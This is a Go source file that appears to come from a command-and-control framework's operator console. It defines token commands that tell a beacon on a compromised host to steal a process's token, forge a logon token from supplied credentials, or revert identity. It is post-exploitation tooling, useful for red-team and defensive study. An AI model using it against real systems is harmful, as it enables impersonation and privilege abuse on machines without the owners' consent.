package grumblecli

import (
	"fmt"

	"github.com/desertbit/grumble"
	"google.golang.org/grpc"

	"orsted/client/clientrpc"
)

func SetTokenCommands(conn grpc.ClientConnInterface) {
	tokenCmd := &grumble.Command{
		Name: "token",
		Help: "Token manipulation",
	}

    whoamiCmd := &grumble.Command{
		Name: "whoami",
		Help: "Return information about Process and Thread token",
		Run: func(c *grumble.Context) error {
            if SelectedSession == nil {
                fmt.Println("No session selected. Use interact command to specify session")
                return nil
            }
			res, err := clientrpc.AddTaskFunc(conn, SelectedSession.Id, "token whoami", nil, "token whoami")
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}
			var data [][]string
			data = append(data, []string{
				res.TaskId,
				res.BeacondId,
				res.State,
				string(res.Command),
			})
			prettyPrint(data, []string{"TASKID", "SESSIONID", "STATE", "COMMAND"}, c.App.Stdout())
			return nil
		},
	}

    rev2selfCmd := &grumble.Command{
		Name: "rev2self",
		Help: "Revert to original identity",
		Run: func(c *grumble.Context) error {
            if SelectedSession == nil {
                fmt.Println("No session selected. Use interact command to specify session")
                return nil
            }
			res, err := clientrpc.AddTaskFunc(conn, SelectedSession.Id, "token rev2self", nil, "token rev2self")
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}
			var data [][]string
			data = append(data, []string{
				res.TaskId,
				res.BeacondId,
				res.State,
				string(res.Command),
			})
			prettyPrint(data, []string{"TASKID", "SESSIONID", "STATE", "COMMAND"}, c.App.Stdout())
			return nil
		},
	}

    stealTokCmd := &grumble.Command{
		Name: "steal",
		Help: "Steal Token",
		Args: func(f *grumble.Args) {
			f.String("pid", "PID of the process to steal token from")
		},
		Run: func(c *grumble.Context) error {
            if SelectedSession == nil {
                fmt.Println("No session selected. Use interact command to specify session")
                return nil
            }
			res, err := clientrpc.AddTaskFunc(conn, SelectedSession.Id, "token steal " + c.Args.String("pid"), nil,"token steal " + c.Args.String("pid"))
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}
			var data [][]string
			data = append(data, []string{
				res.TaskId,
				res.BeacondId,
				res.State,
				string(res.Command),
			})
			prettyPrint(data, []string{"TASKID", "SESSIONID", "STATE", "COMMAND"}, c.App.Stdout())
			return nil
		},
	}

    makeToken := &grumble.Command{
		Name: "make",
		Help: "Make and apply a new token",
		Flags: func(f *grumble.Flags) {
			f.String("t", "logontype", "9", "Logon type. Refer to Microsoft Documentation. Default 9.")
		},
		Args: func(f *grumble.Args) {
			f.String("username", "Username")
			f.String("password", "Password")
		},
		Run: func(c *grumble.Context) error {
            if SelectedSession == nil {
                fmt.Println("No session selected. Use interact command to specify session")
                return nil
            }
			res, err := clientrpc.AddTaskFunc(conn, SelectedSession.Id, "token make " + c.Args.String("username") + " " + c.Args.String("password") + " " + c.Flags.String("logontype"), nil, "token make --logontype " + c.Flags.String("logontype") + " " + c.Args.String("username") + " " + c.Args.String("password"))
			if err != nil {
				fmt.Println("Error Occured ", err.Error())
				return nil
			}
			var data [][]string
			data = append(data, []string{
				res.TaskId,
				res.BeacondId,
				res.State,
				string(res.Command),
			})
			prettyPrint(data, []string{"TASKID", "SESSIONID", "STATE", "COMMAND"}, c.App.Stdout())
			return nil
		},
	}

    tokenCmd.AddCommand(whoamiCmd)
    tokenCmd.AddCommand(makeToken)
    tokenCmd.AddCommand(rev2selfCmd)
    tokenCmd.AddCommand(stealTokCmd)
	app.AddCommand(tokenCmd)
}

